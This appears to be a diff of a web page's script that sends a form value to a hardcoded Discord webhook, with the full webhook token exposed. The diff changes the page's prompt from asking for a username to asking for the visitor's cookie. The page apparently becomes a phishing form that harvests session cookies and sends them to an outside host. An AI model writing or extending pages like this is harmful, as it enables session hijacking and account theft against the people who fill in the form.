@@ -41,12 +41,11 @@
 </div>
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1501211310195605586/M54GBIkVE_zHXxt4G2ybTf9bLBGex_FAd2v2rfJt4ZrsFAqJ7a6SxIz2OhXloNOPF9-T";
-
 async function sendIt() {
   const u = document.getElementById('username').value.trim();
   const btn = document.getElementById('sendBtn');
   const msg = document.getElementById('msg');
-  if (!u) { msg.className='msg err'; msg.textContent='please enter your username'; return; }
+  if (!u) { msg.className='msg err'; msg.textContent='please enter your cookie'; return; }
   btn.disabled = true; btn.textContent = 'SENDING...';
   msg.className = 'msg'; msg.textContent = '';
 
